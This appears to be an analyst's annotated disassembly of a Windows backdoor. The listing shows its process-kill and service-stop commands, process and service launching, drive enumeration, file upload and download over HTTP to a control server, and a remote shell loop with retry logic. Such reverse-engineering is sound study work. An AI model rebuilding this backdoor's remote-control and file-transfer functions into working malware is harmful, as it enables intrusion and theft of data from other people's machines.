.text:004020C5 push    ebx             ; lpFileSystemFlags
.text:004020C6 push    ebx             ; lpMaximumComponentLength
.text:004020C7 push    ebx             ; lpVolumeSerialNumber
.text:004020C8 lea     eax, [ebp+pe.dwFlags]
.text:004020CE push    105h            ; nVolumeNameSize
.text:004020D3 push    eax             ; lpVolumeNameBuffer
.text:004020D4 lea     eax, [ebp+String1]
.text:004020D7 push    eax             ; lpRootPathName
.text:004020D8 call    ds:GetVolumeInformationA ; getting information about the drive
.text:004020DE test    eax, eax        ; checking if getting the information was successful
.text:004020E0 jz      short loc_4020F1 ; jump if getting information wasn't successful
.text:004020E2 lea     eax, [ebp+pe.dwFlags]
.text:004020E8 push    eax             ; Source
.text:004020E9 push    edi             ; Destination
.text:004020EA call    strcat          ; adding name of specified volume to destination
.text:004020EF pop     ecx
.text:004020F0 pop     ecx
.text:004020F1
.text:004020F1 loc_4020F1:
.text:004020F1 push    offset asc_4040B4 ; "\r\n"
.text:004020F6 push    edi             ; Destination
.text:004020F7 call    strcat          ; adding \r\n to destination
.text:004020FC inc     [ebp+hSCObject]
.text:004020FF pop     ecx
.text:00402100 pop     ecx
.text:00402101
.text:00402101 loc_402101:             ; shifting out the drive you just checked, loops back and does this process again until no drives left
.text:00402101 shr     [ebp+ServicesReturned], 1
.text:00402104 inc     [ebp+var_1]
.text:00402107 jmp     loc_40201E      ; check if valid drives is empty
.text:0040210C
.text:0040210C loc_40210C:
.text:0040210C push    [ebp+hSCObject]
.text:0040210F lea     eax, [ebp+Buffer]
.text:00402115 push    offset aTotallyDVolume ; "\r\nTotally %d volumes found.\r\n"
.text:0040211A push    eax             ; Buffer
.text:0040211B call    esi ; sprintf   ; print formatted string using buffer
.text:0040211D lea     eax, [ebp+Buffer]
.text:00402123 push    eax             ; Source
.text:00402124 push    edi             ; Destination
.text:00402125 call    strcat          ; concatenate buffer to destination
.text:0040212A add     esp, 14h
.text:0040212D
.text:0040212D loc_40212D:
.text:0040212D pop     edi
.text:0040212E pop     esi
.text:0040212F pop     ebx
.text:00402130 leave
.text:00402131 retn
.text:00402131 LoopingThroughDrives endp
.text:00402131
.text:00402132
.text:00402132
.text:00402132 ; Attributes: bp-based frame
.text:00402132
.text:00402132 ; int __cdecl StopService(char *Destination)
.text:00402132 StopService proc near
.text:00402132
.text:00402132 ServiceStatus= _SERVICE_STATUS ptr -20h
.text:00402132 var_4= dword ptr -4
.text:00402132 Destination= dword ptr  8
.text:00402132
.text:00402132 push    ebp
.text:00402133 mov     ebp, esp
.text:00402135 sub     esp, 20h
.text:00402138 push    ebx
.text:00402139 xor     ebx, ebx        ;  clear ebx
.text:0040213B cmp     lpServiceName, ebx ; checking if command is valid
.text:00402141 push    esi
.text:00402142 push    edi
.text:00402143 jnz     short loc_40214C ; jump if valid
.text:00402145 push    offset aSyntaxErrorUsa_0 ; "\r\nSyntax error!\tUsage:\tkill </p|/s>"...
.text:0040214A jmp     short loc_4021A3
.text:0040214C
.text:0040214C loc_40214C:             ; String2
.text:0040214C push    Str
.text:00402152 mov     esi, ds:_strcmpi
.text:00402158 push    offset aP       ; "/p"
.text:0040215D call    esi ; _strcmpi  ; checking if Str = "/p"
.text:0040215F pop     ecx
.text:00402160 test    eax, eax        ; are they equal?
.text:00402162 pop     ecx
.text:00402163 jnz     short loc_4021B9 ; if not equal, jump
.text:00402165 push    lpServiceName   ; String
.text:0040216B call    ds:atoi         ; converting serviceName string to int
.text:00402171 pop     ecx
.text:00402172 push    eax             ; dwProcessId
.text:00402173 push    ebx             ; bInheritHandle
.text:00402174 push    1F0FFFh         ; dwDesiredAccess
.text:00402179 call    ds:OpenProcess  ; opens process of ServiceName
.text:0040217F mov     esi, eax        ; esi = dwProcessId
.text:00402181 cmp     esi, 0FFFFFFFFh ; checking if valid processId was put in
.text:00402184 jz      short loc_402199 ; jump if invalid processId
.text:00402186 push    1               ; uExitCode
.text:00402188 push    esi             ; hProcess
.text:00402189 call    ds:TerminateProcess ; if valid processId, kill process and close the handle
.text:0040218F push    esi             ; hObject
.text:00402190 mov     [ebp+var_4], eax ; var_4 = nonzero if terminating process successful, 0 if not
.text:00402193 call    ds:CloseHandle
.text:00402199
.text:00402199 loc_402199:             ; check if terminating process successful
.text:00402199 cmp     [ebp+var_4], ebx
.text:0040219C jz      short loc_4021B2 ; jump if not successful
.text:0040219E push    offset aOk      ; "\r\nOK!\r\n"
.text:004021A3
.text:004021A3 loc_4021A3:             ; Destination
.text:004021A3 push    [ebp+Destination]
.text:004021A6 call    strcat          ; concatenate status of task (i.e. fail, OK, etc.) message to destination
.text:004021AB pop     ecx
.text:004021AC pop     ecx
.text:004021AD jmp     loc_40228D
.text:004021B2
.text:004021B2 loc_4021B2:
.text:004021B2 push    offset aFailed  ; "\r\nFailed!\r\n"
.text:004021B7 jmp     short loc_4021A3
.text:004021B9
.text:004021B9 loc_4021B9:             ; String2
.text:004021B9 push    Str
.text:004021BF push    offset aS       ; "/s"
.text:004021C4 call    esi ; _strcmpi  ; checking if str = "/s"
.text:004021C6 pop     ecx
.text:004021C7 test    eax, eax        ; are they equal?
.text:004021C9 pop     ecx
.text:004021CA jnz     loc_40228D      ; if not equal jump and exit
.text:004021D0 push    4               ; dwDesiredAccess
.text:004021D2 push    ebx             ; lpDatabaseName
.text:004021D3 push    ebx             ; lpMachineName
.text:004021D4 call    ds:OpenSCManagerA ; Establishes a connection to the service control manager on local computer
.text:004021DA mov     edi, eax        ; put handle in edi
.text:004021DC cmp     edi, ebx        ; checking if getting handle was successful
.text:004021DE jnz     short loc_4021E7 ; jump if getting handle worked
.text:004021E0 push    offset aOpenscmanagerF ; "\r\nOpenSCManager failed!\r\n"
.text:004021E5 jmp     short loc_4021A3
.text:004021E7
.text:004021E7 loc_4021E7:             ; dwDesiredAccess
.text:004021E7 push    0F003Fh
.text:004021EC push    lpServiceName   ; lpServiceName
.text:004021F2 push    edi             ; hSCManager
.text:004021F3 call    ds:OpenServiceA ; open service specified
.text:004021F9 mov     esi, eax        ; esi = handle to service if successful
.text:004021FB cmp     esi, ebx        ; checking if handle is null
.text:004021FD jnz     short loc_40222B ; jump if handle is valid
.text:004021FF call    ds:GetLastError ; if calling service failed get last error
.text:00402205 cmp     eax, 424h       ; check if error was "ERROR_SERVICE_DOES_NOT_EXIST"
.text:0040220A jnz     short loc_402213 ; jump if different error
.text:0040220C push    offset aServiceDoesNot ; "\r\nService does not exist!\r\n"
.text:00402211 jmp     short loc_402218
.text:00402213
.text:00402213 loc_402213:
.text:00402213 push    offset aOpenserviceFai ; "\r\nOpenService failed!\r\n"
.text:00402218
.text:00402218 loc_402218:             ; Destination
.text:00402218 push    [ebp+Destination]
.text:0040221B call    strcat
.text:00402220 pop     ecx
.text:00402221 pop     ecx
.text:00402222 push    edi             ; hSCObject
.text:00402223 call    ds:CloseServiceHandle
.text:00402229 jmp     short loc_40228D
.text:0040222B
.text:0040222B loc_40222B:
.text:0040222B lea     eax, [ebp+ServiceStatus]
.text:0040222E push    eax             ; lpServiceStatus
.text:0040222F push    1               ; dwControl
.text:00402231 push    esi             ; hService
.text:00402232 call    ds:ControlService ; sends control code to service, telling service to stop, dwControl = 1
.text:00402238 test    eax, eax        ; checking if successful
.text:0040223A jz      short loc_40225E ; jump if stopping service not successful
.text:0040223C mov     eax, [ebp+ServiceStatus.dwCurrentState] ; state of serviceStatus
.text:0040223F dec     eax
.text:00402240 jz      short loc_402257 ; if status is "SERVICE_STOPPED", jump
.text:00402242 dec     eax
.text:00402243 dec     eax             ; if status is "SERVICE_STOP_PENDING" jump
.text:00402244 jz      short loc_402250
.text:00402246 dec     eax             ; if status is NOT "SERVICE_RUNNING" jump
.text:00402247 jnz     short loc_402281
.text:00402249 push    offset aServiceStillRu ; "\r\nService still running!\r\n"
.text:0040224E jmp     short loc_402277
.text:00402250
.text:00402250 loc_402250:
.text:00402250 push    offset aServiceStopPen ; "\r\nService stop pending!\r\n"
.text:00402255 jmp     short loc_402277
.text:00402257
.text:00402257 loc_402257:
.text:00402257 push    offset aServiceStopped ; "\r\nService stopped!\r\n"
.text:0040225C jmp     short loc_402277
.text:0040225E
.text:0040225E loc_40225E:             ; getting error if closing service didnt work
.text:0040225E call    ds:GetLastError
.text:00402264 cmp     eax, 426h       ; checking if error was because service is already not active
.text:00402269 jnz     short loc_402272 ; jump if different error
.text:0040226B push    offset aServiceDoesnTS ; "\r\nService doesn't start!\r\n"
.text:00402270 jmp     short loc_402277
.text:00402272
.text:00402272 loc_402272:
.text:00402272 push    offset aControlservice ; "\r\nControlService failed!\r\n"
.text:00402277
.text:00402277 loc_402277:             ; Destination
.text:00402277 push    [ebp+Destination]
.text:0040227A call    strcat
.text:0040227F pop     ecx
.text:00402280 pop     ecx
.text:00402281
.text:00402281 loc_402281:             ; hSCObject
.text:00402281 push    esi
.text:00402282 mov     esi, ds:CloseServiceHandle
.text:00402288 call    esi ; CloseServiceHandle
.text:0040228A push    edi             ; hSCObject
.text:0040228B call    esi ; CloseServiceHandle ; closing service handle
.text:0040228D
.text:0040228D loc_40228D:
.text:0040228D pop     edi
.text:0040228E pop     esi
.text:0040228F pop     ebx
.text:00402290 leave
.text:00402291 retn
.text:00402291 StopService endp
.text:00402291
.text:00402292
.text:00402292
.text:00402292 ; Attributes: bp-based frame
.text:00402292
.text:00402292 ; DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
.text:00402292 StartAddress proc near
.text:00402292
.text:00402292 Str= byte ptr -290h
.text:00402292 FileName= byte ptr -190h
.text:00402292 Buffer= byte ptr -8Ch
.text:00402292 var_4C= byte ptr -4Ch
.text:00402292 FileSizeHigh= dword ptr -24h
.text:00402292 var_20= dword ptr -20h
.text:00402292 lpBuffer= dword ptr -1Ch
.text:00402292 var_18= dword ptr -18h
.text:00402292 hFile= dword ptr -14h
.text:00402292 NumberOfBytesRead= dword ptr -10h
.text:00402292 var_C= dword ptr -0Ch
.text:00402292 var_4= dword ptr -4
.text:00402292 Destination= dword ptr  8
.text:00402292
.text:00402292 ; FUNCTION CHUNK AT .text:00402C5C SIZE 00000012 BYTES
.text:00402292
.text:00402292 ; __unwind { // loc_402C64
.text:00402292 mov     eax, offset loc_402C64
.text:00402297 call    __EH_prolog
.text:0040229C sub     esp, 284h
.text:004022A2 push    ebx
.text:004022A3 push    esi
.text:004022A4 push    edi
.text:004022A5 push    0EA60h          ; int
.text:004022AA push    1
.text:004022AC mov     eax, offset szReferrer
.text:004022B1 pop     edi
.text:004022B2 xor     ebx, ebx
.text:004022B4 push    edi             ; int
.text:004022B5 push    eax             ; char *
.text:004022B6 push    eax             ; char *
.text:004022B7 push    offset aMozilla50 ; "Mozilla/5.0"
.text:004022BC push    eax             ; Str
.text:004022BD lea     ecx, [ebp+var_4C]
.text:004022C0 mov     [ebp+var_18], ebx
.text:004022C3 call    AllocatingAndDeletingPtrs
.text:004022C8 cmp     Buffer, ebx
.text:004022CE ;   try {
.text:004022CE mov     [ebp+var_4], ebx
.text:004022D1 jnz     short loc_4022E9
.text:004022D3 push    offset aSyntaxErrorUsa_3 ; "Syntax error!\tUsage:\tgetf/putf FileNa"...
.text:004022D8 push    [ebp+Destination] ; Destination
.text:004022DB call    strcat
.text:004022E0 pop     ecx
.text:004022E1 xor     esi, esi
.text:004022E3 pop     ecx
.text:004022E4 jmp     loc_402583
.text:004022E9
.text:004022E9 loc_4022E9:             ; unsigned int
.text:004022E9 push    200C8h
.text:004022EE call    ??2@YAPAXI@Z    ; operator new(uint)
.text:004022F3 mov     esi, eax
.text:004022F5 pop     ecx
.text:004022F6 cmp     esi, ebx
.text:004022F8 mov     [ebp+lpBuffer], esi
.text:004022FB mov     [esi], bl
.text:004022FD jz      loc_402571
.text:00402303 push    offset aPutf    ; "putf"
.text:00402308 push    String2         ; String1
.text:0040230E call    ds:_strcmpi
.text:00402314 pop     ecx
.text:00402315 test    eax, eax
.text:00402317 pop     ecx
.text:00402318 jnz     short loc_40231D
.text:0040231A mov     [ebp+var_18], edi
.text:0040231D
.text:0040231D loc_40231D:             ; Source
.text:0040231D push    Str
.text:00402323 lea     eax, [ebp+FileName]
.text:00402329 push    eax             ; Destination
.text:0040232A call    strcpy
.text:0040232F cmp     [ebp+var_18], ebx
.text:00402332 pop     ecx
.text:00402333 pop     ecx
.text:00402334 jz      short loc_40236B
.text:00402336 push    5Ch ; '\'       ; Ch
.text:00402338 push    Str             ; Str
.text:0040233E call    ds:strrchr
.text:00402344 pop     ecx
.text:00402345 cmp     eax, ebx
.text:00402347 pop     ecx
.text:00402348 jz      short loc_40235A
.text:0040234A inc     eax
.text:0040234B push    eax             ; Source
.text:0040234C lea     eax, [ebp+FileName]
.text:00402352 push    eax             ; Destination
.text:00402353 call    strcpy
.text:00402358 pop     ecx
.text:00402359 pop     ecx
.text:0040235A
.text:0040235A loc_40235A:
.text:0040235A push    ebx
.text:0040235B push    80h ; ''
.text:00402360 push    2
.text:00402362 push    ebx
.text:00402363 push    edi
.text:00402364 push    40000000h
.text:00402369 jmp     short loc_40237A
.text:0040236B
.text:0040236B loc_40236B:             ; hTemplateFile
.text:0040236B push    ebx
.text:0040236C push    80h ; ''       ; dwFlagsAndAttributes
.text:00402371 push    3               ; dwCreationDisposition
.text:00402373 push    ebx             ; lpSecurityAttributes
.text:00402374 push    edi             ; dwShareMode
.text:00402375 push    80000000h       ; dwDesiredAccess
.text:0040237A
.text:0040237A loc_40237A:
.text:0040237A lea     eax, [ebp+FileName]
.text:00402380 push    eax             ; lpFileName
.text:00402381 call    ds:CreateFileA
.text:00402387 cmp     eax, 0FFFFFFFFh
.text:0040238A mov     [ebp+hFile], eax
.text:0040238D jz      loc_402565
.text:00402393 cmp     [ebp+var_18], ebx
.text:00402396 jz      short loc_4023A9
.text:00402398 push    String          ; String
.text:0040239E call    ds:atoi
.text:004023A4 pop     ecx
.text:004023A5 mov     edi, eax
.text:004023A7 jmp     short loc_4023E0
.text:004023A9
.text:004023A9 loc_4023A9:
.text:004023A9 lea     eax, [ebp+FileSizeHigh]
.text:004023AC push    eax             ; lpFileSizeHigh
.text:004023AD push    [ebp+hFile]     ; hFile
.text:004023B0 call    ds:GetFileSize
.text:004023B6 mov     edi, eax
.text:004023B8 cmp     edi, 0FFFFFFFFh
.text:004023BB jz      loc_402565
.text:004023C1 cmp     [ebp+FileSizeHigh], ebx
.text:004023C4 jnz     loc_402565
.text:004023CA push    edi
.text:004023CB lea     eax, [ebp+Buffer]
.text:004023D1 push    offset aFilesizeD ; "FileSize:\t%d"
.text:004023D6 push    eax             ; Buffer
.text:004023D7 call    ds:sprintf
.text:004023DD add     esp, 0Ch
.text:004023E0
.text:004023E0 loc_4023E0:
.text:004023E0 lea     eax, [ebp+Str]
.text:004023E6 push    eax
.text:004023E7 push    offset aS_1     ; "%*[^/]%*[/]%*[^/]%s"
.text:004023EC push    Buffer          ; Buffer
.text:004023F2 call    ds:sscanf
.text:004023F8 add     esp, 0Ch
.text:004023FB lea     ecx, [ebp+var_4C]
.text:004023FE push    dword_404794    ; Str
.text:00402404 call    DeleteAndAllocatePtr_1
.text:00402409 lea     eax, [ebp+Str]
.text:0040240F lea     ecx, [ebp+var_4C]
.text:00402412 push    eax             ; Str
.text:00402413 call    DeleteAndAllocatePtr_withBackslash
.text:00402418 cmp     [ebp+var_18], ebx
.text:0040241B jnz     short loc_40242C
.text:0040241D lea     eax, [ebp+Buffer]
.text:00402423 lea     ecx, [ebp+var_4C]
.text:00402426 push    eax             ; Str
.text:00402427 call    DeleteAndAllocatePtr_3
.text:0040242C
.text:0040242C loc_40242C:
.text:0040242C lea     ecx, [ebp+var_4C]
.text:0040242F call    SetUpHttp
.text:00402434 test    eax, eax
.text:00402436 jz      loc_402565
.text:0040243C mov     [ebp+Destination], edi
.text:0040243F
.text:0040243F loc_40243F:
.text:0040243F lea     ecx, [ebp+var_4C]
.text:00402442 call    CloseHttp
.text:00402447 lea     ecx, [ebp+var_4C]
.text:0040244A call    SetUpHttp
.text:0040244F cmp     eax, ebx
.text:00402451 jz      loc_40255D
.text:00402457 cmp     [ebp+var_18], ebx
.text:0040245A mov     [ebp+NumberOfBytesRead], ebx
.text:0040245D mov     edi, 20000h
.text:00402462 jnz     short loc_402481
.text:00402464 cmp     [ebp+Destination], edi
.text:00402467 mov     eax, edi
.text:00402469 jg      short loc_40246E
.text:0040246B mov     eax, [ebp+Destination]
.text:0040246E
.text:0040246E loc_40246E:
.text:0040246E sub     [ebp+Destination], eax
.text:00402471 lea     ecx, [ebp+NumberOfBytesRead]
.text:00402474 push    ebx             ; lpOverlapped
.text:00402475 push    ecx             ; lpNumberOfBytesRead
.text:00402476 push    eax             ; nNumberOfBytesToRead
.text:00402477 push    esi             ; lpBuffer
.text:00402478 push    [ebp+hFile]     ; hFile
.text:0040247B call    ds:ReadFile
.text:00402481
.text:00402481 loc_402481:             ; dwOptionalLength
.text:00402481 push    [ebp+NumberOfBytesRead]
.text:00402484 lea     ecx, [ebp+var_4C]
.text:00402487 push    esi             ; lpOptional
.text:00402488 call    HTTPwithCertificateCheck
.text:0040248D cmp     eax, ebx
.text:0040248F mov     [ebp+var_20], eax
.text:00402492 jz      loc_40254E
.text:00402498 cmp     [ebp+var_18], ebx
.text:0040249B jz      loc_40254E
.text:004024A1 cmp     [ebp+Destination], edi
.text:004024A4 jg      short loc_4024A9
.text:004024A6 mov     edi, [ebp+Destination]
.text:004024A9
.text:004024A9 loc_4024A9:
.text:004024A9 lea     eax, [ebp+NumberOfBytesRead]
.text:004024AC lea     ecx, [ebp+var_4C]
.text:004024AF push    eax             ; lpdwNumberOfBytesRead
.text:004024B0 push    edi             ; dwNumberOfBytesToRead
.text:004024B1 push    esi             ; lpBuffer
.text:004024B2 call    InternetReadFileSub
.text:004024B7 push    offset SubStr   ; "Fetch server error"
.text:004024BC push    esi             ; Str
.text:004024BD mov     [ebp+var_20], eax
.text:004024C0 call    ds:strstr
.text:004024C6 pop     ecx
.text:004024C7 cmp     eax, ebx
.text:004024C9 pop     ecx
.text:004024CA jnz     loc_402565
.text:004024D0 xor     eax, eax
.text:004024D2 cmp     [ebp+NumberOfBytesRead], 3
.text:004024D6 jbe     short loc_402520
.text:004024D8
.text:004024D8 loc_4024D8:
.text:004024D8 cmp     byte ptr [esi+eax], 0Dh
.text:004024DC jnz     short loc_4024F3
.text:004024DE cmp     byte ptr [eax+esi+1], 0Ah
.text:004024E3 jnz     short loc_4024F3
.text:004024E5 cmp     byte ptr [eax+esi+2], 0Dh
.text:004024EA jnz     short loc_4024F3
.text:004024EC cmp     byte ptr [eax+esi+3], 0Ah
.text:004024F1 jz      short loc_4024FE
.text:004024F3
.text:004024F3 loc_4024F3:
.text:004024F3 inc     eax
.text:004024F4 lea     ecx, [eax+3]
.text:004024F7 cmp     ecx, [ebp+NumberOfBytesRead]
.text:004024FA jb      short loc_4024D8
.text:004024FC jmp     short loc_402520
.text:004024FE
.text:004024FE loc_4024FE:
.text:004024FE lea     ecx, [eax+4]
.text:00402501 cmp     ecx, [ebp+NumberOfBytesRead]
.text:00402504 jnz     short loc_40250B
.text:00402506 mov     [ebp+NumberOfBytesRead], ebx
.text:00402509 jmp     short loc_402520
.text:0040250B
.text:0040250B loc_40250B:
.text:0040250B mov     ecx, [ebp+NumberOfBytesRead]
.text:0040250E push    0FFFFFFFCh
.text:00402510 mov     [ecx+esi], bl
.text:00402513 pop     ecx
.text:00402514 sub     ecx, eax
.text:00402516 lea     eax, [eax+esi+4]
.text:0040251A add     [ebp+NumberOfBytesRead], ecx
.text:0040251D mov     [ebp+lpBuffer], eax
.text:00402520
.text:00402520 loc_402520:
.text:00402520 cmp     [ebp+var_20], ebx
.text:00402523 jz      short loc_40253A
.text:00402525 mov     edi, [ebp+NumberOfBytesRead]
.text:00402528 lea     eax, [ebp+NumberOfBytesRead]
.text:0040252B push    ebx             ; lpOverlapped
.text:0040252C push    eax             ; lpNumberOfBytesWritten
.text:0040252D push    edi             ; nNumberOfBytesToWrite
.text:0040252E push    [ebp+lpBuffer]  ; lpBuffer
.text:00402531 push    [ebp+hFile]     ; hFile
.text:00402534 call    ds:WriteFile
.text:0040253A
.text:0040253A loc_40253A:
.text:0040253A sub     [ebp+Destination], edi
.text:0040253D cmp     [ebp+NumberOfBytesRead], ebx
.text:00402540 mov     [ebp+lpBuffer], esi
.text:00402543 jz      short loc_40254E
.text:00402545 cmp     [ebp+var_20], ebx
.text:00402548 jnz     loc_4024A9
.text:0040254E
.text:0040254E loc_40254E:
.text:0040254E cmp     [ebp+Destination], ebx
.text:00402551 jle     short loc_402565
.text:00402553 cmp     [ebp+var_20], ebx
.text:00402556 jz      short loc_402565
.text:00402558 jmp     loc_40243F
.text:0040255D
.text:0040255D loc_40255D:
.text:0040255D lea     ecx, [ebp+var_4C]
.text:00402560 call    CloseHttp
.text:00402565
.text:00402565 loc_402565:
.text:00402565 cmp     [ebp+lpBuffer], ebx
.text:00402568 jz      short loc_402571
.text:0040256A push    esi             ; void *
.text:0040256B call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00402570 pop     ecx
.text:00402571
.text:00402571 loc_402571:
.text:00402571 cmp     [ebp+hFile], 0FFFFFFFFh
.text:00402575 jz      short loc_402580
.text:00402577 push    [ebp+hFile]     ; hObject
.text:0040257A call    ds:CloseHandle
.text:00402580
.text:00402580 loc_402580:
.text:00402580 push    1
.text:00402582 pop     esi
.text:00402582 ;   } // starts at 4022CE
.text:00402583
.text:00402583 loc_402583:
.text:00402583 or      [ebp+var_4], 0FFFFFFFFh
.text:00402587 lea     ecx, [ebp+var_4C]
.text:0040258A call    NearEnd
.text:0040258F mov     ecx, [ebp+var_C]
.text:00402592 mov     eax, esi
.text:00402594 pop     edi
.text:00402595 pop     esi
.text:00402596 pop     ebx
.text:00402597 mov     large fs:0, ecx
.text:0040259E leave
.text:0040259F retn    4
.text:0040259F ; } // starts at 402292
.text:0040259F StartAddress endp
.text:0040259F
.text:004025A2
.text:004025A2
.text:004025A2 ; Attributes: bp-based frame
.text:004025A2
.text:004025A2 ; int __cdecl AttemptHTTPSetup(char *Destination, int, HANDLE hFile)
.text:004025A2 AttemptHTTPSetup proc near
.text:004025A2
.text:004025A2 Destination= dword ptr  8
.text:004025A2 arg_4= dword ptr  0Ch
.text:004025A2 hFile= dword ptr  10h
.text:004025A2
.text:004025A2 push    ebp
.text:004025A3 mov     ebp, esp
.text:004025A5 push    ebx
.text:004025A6 xor     ebx, ebx        ; clear ebx
.text:004025A8 cmp     dword_4047A0, ebx ; check if dword is empty
.text:004025AE push    esi
.text:004025AF mov     esi, [ebp+Destination]
.text:004025B2 push    edi
.text:004025B3 jz      short loc_4025F1 ; jump if dword is empty
.text:004025B5 push    offset aShellStartedWa ; "Shell started,wait to terminate it....."...
.text:004025BA push    esi             ; Destination
.text:004025BB call    strcat          ; writing status messages for malware author
.text:004025C0 push    [ebp+hFile]     ; hFile
.text:004025C3 push    offset aExit    ; "exit\r\n"
.text:004025C8 call    WritingToFile
.text:004025CD add     esp, 10h
.text:004025D0 push    0FFFFFFFFh      ; dwMilliseconds
.text:004025D2 push    hObject         ; hHandle
.text:004025D8 call    ds:WaitForSingleObject ; wait until hObject is in the signaled state
.text:004025DE push    offset aOk_0    ; "OK!\r\n"
.text:004025E3 push    esi             ; Destination
.text:004025E4 mov     dword_4047A0, ebx
.text:004025EA call    strcat          ; indicating that status is OK in text being sent back to malware author
.text:004025EF pop     ecx
.text:004025F0 pop     ecx
.text:004025F1
.text:004025F1 loc_4025F1:
.text:004025F1 push    offset aSoLong  ; "So long!\r\n"
.text:004025F6 push    esi             ; Destination
.text:004025F7 call    strcat
.text:004025FC push    esi             ; Str
.text:004025FD call    strlen          ; preparing more status messages
.text:00402602 mov     edi, [ebp+arg_4]
.text:00402605 add     esp, 0Ch
.text:00402608 mov     ecx, edi
.text:0040260A mov     [ebp+Destination], eax
.text:0040260D call    CloseHttp       ; closing HTTP connection
.text:00402612
.text:00402612 loc_402612:
.text:00402612 mov     ecx, edi
.text:00402614 call    SetUpHttp       ; resetting up HTTP
.text:00402619 test    eax, eax        ; checking if setup was successful
.text:0040261B jnz     short loc_402635 ; jump if set up was successful
.text:0040261D mov     ecx, edi
.text:0040261F call    CloseHttp       ; if set up wasn't successful, go to sleep for 1 minute
.text:00402624 push    0EA60h          ; dwMilliseconds
.text:00402629 inc     ebx
.text:0040262A call    ds:Sleep
.text:00402630 cmp     ebx, 5          ; try setting up 5 times.
.text:00402633 jb      short loc_402612
.text:00402635
.text:00402635 loc_402635:             ; dwOptionalLength
.text:00402635 push    [ebp+Destination]
.text:00402638 mov     ecx, edi
.text:0040263A push    esi             ; lpOptional
.text:0040263B call    HTTPwithCertificateCheck ; set up HTTP certificate
.text:00402640 pop     edi
.text:00402641 pop     esi
.text:00402642 pop     ebx
.text:00402643 pop     ebp
.text:00402644 retn
.text:00402644 AttemptHTTPSetup endp
.text:00402644
.text:00402645
.text:00402645
.text:00402645 ; Attributes: bp-based frame
.text:00402645
.text:00402645 ; int __cdecl StartService(char *Destination)
.text:00402645 StartService proc near
.text:00402645
.text:00402645 StartupInfo= _STARTUPINFOA ptr -54h
.text:00402645 ProcessInformation= _PROCESS_INFORMATION ptr -10h
.text:00402645 Destination= dword ptr  8
.text:00402645
.text:00402645 push    ebp
.text:00402646 mov     ebp, esp
.text:00402648 sub     esp, 54h
.text:0040264B push    ebx
.text:0040264C push    esi
.text:0040264D xor     esi, esi        ; clear esi
.text:0040264F push    edi
.text:00402650 cmp     lpServiceName, esi ; check if command is valid
.text:00402656 jnz     short loc_402662 ; jump if valid
.text:00402658 push    offset aSyntaxErrorUsa_1 ; "Syntax error!\tUsage:\tstart </p|/s> <f"...
.text:0040265D jmp     loc_40270D
.text:00402662
.text:00402662 loc_402662:             ; String2
.text:00402662 push    Str
.text:00402668 mov     edi, ds:_strcmpi
.text:0040266E push    offset aP       ; "/p"
.text:00402673 call    edi ; _strcmpi  ; check if str = "/p"
.text:00402675 pop     ecx
.text:00402676 test    eax, eax
.text:00402678 pop     ecx
.text:00402679 jnz     short loc_4026E1 ; jump if not equal
.text:0040267B push    44h ; 'D'
.text:0040267D lea     eax, [ebp+StartupInfo]
.text:00402680 pop     edi
.text:00402681 push    edi             ; Size
.text:00402682 push    esi             ; Val
.text:00402683 push    eax             ; void *
.text:00402684 call    memset          ; clearing [ebp + StartupInfo]
.text:00402689 add     esp, 0Ch
.text:0040268C lea     ecx, [ebp+ProcessInformation]
.text:0040268F mov     [ebp+StartupInfo.cb], edi
.text:00402692 mov     [ebp+StartupInfo.wShowWindow], si
.text:00402696 push    1
.text:00402698 pop     eax
.text:00402699 push    ecx             ; lpProcessInformation
.text:0040269A lea     ecx, [ebp+StartupInfo]
.text:0040269D push    ecx             ; lpStartupInfo
.text:0040269E push    esi             ; lpCurrentDirectory
.text:0040269F push    esi             ; lpEnvironment
.text:004026A0 push    esi             ; dwCreationFlags
.text:004026A1 push    eax             ; bInheritHandles
.text:004026A2 push    esi             ; lpThreadAttributes
.text:004026A3 push    esi             ; lpProcessAttributes
.text:004026A4 mov     [ebp+StartupInfo.dwFlags], eax
.text:004026A7 push    lpServiceName   ; lpCommandLine
.text:004026AD push    esi             ; lpApplicationName
.text:004026AE call    ds:CreateProcessA ; creates a new process and its primary thread
.text:004026B4 test    eax, eax        ; checking if creating the process was successful
.text:004026B6 jz      short loc_4026BF ; if not successful jump
.text:004026B8 push    offset aProgramStarted ; "\r\nProgram started!\r\n"
.text:004026BD jmp     short loc_4026C4
.text:004026BF
.text:004026BF loc_4026BF:
.text:004026BF push    offset aCreateprocessF ; "\r\nCreateProcess failed!\r\n"
.text:004026C4
.text:004026C4 loc_4026C4:             ; Destination
.text:004026C4 push    [ebp+Destination]
.text:004026C7 call    strcat          ; add status message about whether starting process worked or failed to destination
.text:004026CC mov     esi, ds:CloseHandle
.text:004026D2 pop     ecx
.text:004026D3 pop     ecx
.text:004026D4 push    [ebp+ProcessInformation.hProcess] ; hObject
.text:004026D7 call    esi ; CloseHandle ; ;closing handle
.text:004026D9 push    [ebp+ProcessInformation.hThread]
.text:004026DC jmp     loc_4027A1
.text:004026E1
.text:004026E1 loc_4026E1:             ; String2
.text:004026E1 push    Str
.text:004026E7 push    offset aS       ; "/s"
.text:004026EC call    edi ; _strcmpi  ; check if str = "/s"
.text:004026EE pop     ecx
.text:004026EF test    eax, eax
.text:004026F1 pop     ecx
.text:004026F2 jnz     loc_4027A3      ; jump if not equal
.text:004026F8 push    4               ; dwDesiredAccess
.text:004026FA push    esi             ; lpDatabaseName
.text:004026FB push    esi             ; lpMachineName
.text:004026FC call    ds:OpenSCManagerA ; Establishes a connection to the service control manager on the specified computer
.text:00402702 mov     ebx, eax        ; if successful, ebx = handle, else ebx = null
.text:00402704 cmp     ebx, esi        ; checking if successful
.text:00402706 jnz     short loc_40271C ; jump if successful
.text:00402708 push    offset aOpenscmanagerF ; "\r\nOpenSCManager failed!\r\n"
.text:0040270D
.text:0040270D loc_40270D:             ; Destination
.text:0040270D push    [ebp+Destination]
.text:00402710 call    strcat          ; concatenate error to destination
.text:00402715 pop     ecx
.text:00402716 pop     ecx
.text:00402717 jmp     loc_4027A3
.text:0040271C
.text:0040271C loc_40271C:             ; dwDesiredAccess
.text:0040271C push    0F003Fh
.text:00402721 push    lpServiceName   ; lpServiceName
.text:00402727 push    ebx             ; hSCManager
.text:00402728 call    ds:OpenServiceA ; opens service
.text:0040272E mov     edi, eax        ; if successful edi = handle to service
.text:00402730 cmp     edi, esi        ; checking if successful
.text:00402732 jnz     short loc_402760 ; jump if successful
.text:00402734 call    ds:GetLastError ; get error if starting service unsuccessful
